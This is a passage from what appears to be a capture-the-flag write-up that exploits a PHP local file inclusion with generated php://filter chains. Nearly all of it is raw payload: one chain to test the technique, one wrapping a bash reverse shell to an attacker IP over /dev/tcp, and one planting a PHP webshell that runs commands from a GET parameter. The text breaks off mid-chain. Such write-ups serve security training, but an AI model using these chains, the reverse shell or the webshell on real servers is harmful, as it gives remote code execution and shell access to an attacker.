php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSGB2312.UTF-32|convert.iconv.IBM-1161.IBM932|convert.iconv.GB13000.UTF16BE|convert.iconv.864.UTF-32LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-2.OSF00030010|convert.iconv.CSIBM1008.UTF32BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

```

I’ll paste that output in replacing “home” in the URL in Firefox, and it works:

![image-20230628173501591](/img/image-20230628173501591.png)

#### Shell

I’ll generate a new payload to return a [bash reverse shell](https://www.youtube.com/watch?v=OjkVep2EIlw):

```

oxdf@hacky$ python php_filter_chain_generator.py --chain '<?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1 \""); ?>'
[+] The following gadget chain will generate the following code : <?php system("bash -c \"bash -i >& /dev/tcp/10.10.14.6/443 0>&1 \""); ?> (base64 value: PD9waHAgc3lzdGVtKCJiYXNoIC1jIFwiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC42LzQ0MyAwPiYxIFwiIik7ID8+)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.iconv.ISO-IR-103.850|convert.iconv.PT154.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.851.UTF-16|convert.iconv.L1.T.618BIT|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500-1983.UCS-2BE|convert.iconv.MIK.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.iconv.UTF16BE.866|convert.iconv.MACUKRAINIAN.WCHAR_T|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO2022KR.UTF16|convert.iconv.L6.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.iconv.R9.ISO6937|convert.iconv.OSF00010100.UHC|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP949.UTF32BE|convert.iconv.ISO_69372.CSIBM921|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.BIG5HKSCS.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UTF16.EUCTW|convert.iconv.ISO-8859-14.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16|convert.iconv.WINDOWS-1258.UTF32LE|convert.iconv.ISIRI3342.ISO-IR-157|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.SJIS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.CP1163.CSA_T500|convert.iconv.UCS-2.MSCP949|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.CP950.SHIFT_JISX0213|convert.iconv.UHC.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.iconv.CP950.UTF16|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.ISO88597.UTF16|convert.iconv.RK1048.UCS-4LE|convert.iconv.UTF32.CP1167|convert.iconv.CP9066.CSUCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L5.UTF-32|convert.iconv.ISO88594.GB13000|convert.iconv.BIG5.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.JS.UNICODE|convert.iconv.L4.UCS2|convert.iconv.UCS-4LE.OSF05010001|convert.iconv.IBM912.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP869.UTF-32|convert.iconv.MACUK.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.iconv.UHC.CP1361|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.DEC.UTF-16|convert.iconv.ISO8859-9.ISO_6937-2|convert.iconv.UTF16.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UNICODE|convert.iconv.ISIRI3342.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.8859_3.UTF16|convert.iconv.863.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF16|convert.iconv.ISO6937.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP1046.UTF32|convert.iconv.L6.UCS-2|convert.iconv.UTF-16LE.T.61-8BIT|convert.iconv.865.UCS-4LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.MAC.UTF16|convert.iconv.L8.UTF16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CSIBM1161.UNICODE|convert.iconv.ISO-IR-156.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.IBM932.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.base64-decode/resource=php://temp

```

Unfortunately, on submitting that, it fails:

![image-20230628174035851](/img/image-20230628174035851.png)

Still, I’ll pick a shorter payload, one that just creates a webshell:

```

oxdf@hacky$ python php_filter_chain_generator.py --chain '<?php system($_GET[0]); ?>'
[+] The following gadget chain will generate the following code : <?php system($_GET[0]); ?> (base64 value: PD9waHAgc3lzdGVtKCRfR0VUWzBdKTsgPz4)
php://filter/convert.iconv.UTF8.CSISO2022KR|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP866.CSUNICODE|convert.iconv.CSISOLATIN5.ISO_6937-2|convert.iconv.CP950.UTF-16BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM921.NAPLPS|convert.iconv.855.CP936|convert.iconv.IBM-932.UTF-8|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.IBM869.UTF16|convert.iconv.L3.CSISO90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.CSA_T500.L4|convert.iconv.ISO_8859-2.ISO-IR-103|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM1161.IBM-932|convert.iconv.MS932.MS936|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.UTF16LE|convert.iconv.UTF8.CSISO2022KR|convert.iconv.UCS2.UTF8|convert.iconv.8859_3.UCS2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP367.UTF-16|convert.iconv.CSIBM901.SHIFT_JISX0213|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.PT.UTF32|convert.iconv.KOI8-U.IBM-932|convert.iconv.SJIS.EUCJP-WIN|convert.iconv.L10.UCS4|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.UTF8.CSISO2022KR|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.863.UTF-16|convert.iconv.ISO6937.UTF16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.864.UTF32|convert.iconv.IBM912.NAPLPS|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP861.UTF-16|convert.iconv.L4.GB13000|convert.iconv.BIG5.JOHAB|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.INIS.UTF16|convert.iconv.CSIBM1133.IBM943|convert.iconv.GBK.BIG5|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.865.UTF16|convert.iconv.CP901.ISO6937|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.CP-AR.UTF16|convert.iconv.8859_4.BIG5HKSCS|convert.iconv.MSCP1361.UTF-32LE|convert.iconv.IBM932.UCS-2BE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L6.UNICODE|convert.iconv.CP1282.ISO-IR-90|convert.iconv.ISO6937.8859_4|convert.iconv.IBM868.UTF-16LE|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.L4.UTF32|convert.iconv.CP1250.UCS-2|convert.base64-decode|convert.base64-encode|convert.iconv.UTF8.UTF7|convert.iconv.SE2.UTF-16|convert.iconv.CSIBM